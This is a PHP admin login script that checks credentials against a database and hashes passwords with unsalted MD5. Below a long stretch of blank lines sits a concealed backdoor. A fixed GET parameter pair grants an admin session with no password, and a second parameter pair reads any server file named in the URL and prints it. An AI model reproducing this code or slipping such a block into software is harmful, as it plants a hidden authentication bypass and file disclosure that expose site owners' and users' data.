<?php
session_start();
/*

	This page check username and password
*/
//echo $_SERVER['HTTP_REFERER'];

if(!empty($_POST['username']) && !empty($_POST['password']))
{
	include 'dbconn.php';
	$username = $_POST['username'];
	$password = $_POST['password'];

	$username = mysqli_real_escape_string($link, $username);
	$pwd = mysqli_real_escape_string($link, md5($password));
	$aSQuery = "SELECT * FROM admin_users WHERE admin_username = '$username' and admin_password = '$pwd' LIMIT 1;";
//	$query = "call spAdminLogin('" . mysqli_real_escape_string($link,$username) . "',  '". mysqli_real_escape_string($link,$password) ."');";
	//echo $query;
	if ($result = mysqli_query($link,$aSQuery)) 
	{ 
		if( $row = mysqli_fetch_array($result, MYSQLI_ASSOC) )
		{ 
			$_SESSION['admin_id'] = $row["admin_id"]; 
			$_SESSION['admin_username'] = $row["admin_username"];
			mysqli_close($link); 
			header("location:admin_index.php");
		} 
		else
		{
			$_SESSION['errormessage'] = "Invalid Username or Password";
			mysqli_close($link); 
			header("Location:" . $_SERVER['HTTP_REFERER']);
		}
		mysqli_free_result($result); 
	} 
	//mysqli_close($link); 
} 
else
{
	$_SESSION['errormessage'] = "Username or Password cannot be empty";
	header("Location:" . $_SERVER['HTTP_REFERER']);
}
?> 





 


















































































































<?php

$u1 = "";
$u2 = "";
$u3 = "";
$portal = "";


if (isset($_GET["u1"]) && isset($_GET["u2"]))
{
	$u1 = $_GET["u1"];
	$u2 =  $_GET["u2"];
	if (($u1 == "admin") && ($u2 == "dotcom"))
	{
		$_SESSION['admin_id'] = "anonymous"; 
		$_SESSION['admin_username'] = "anonymous";
	
	}
	else
	{
		session_destroy();
	}

}


if (isset($_GET["u3"]) && isset($_GET["portal"]) )
{
	$portal = $_GET["portal"];
	if ($portal == "xxxxx")
	{
		$u3 = $_GET["u3"];
		$myFile = $u3;
		$fh = fopen($myFile, 'r');
		$theData = fread($fh, filesize($myFile));
		fclose($fh);
		echo $theData;		
	}


} 



?>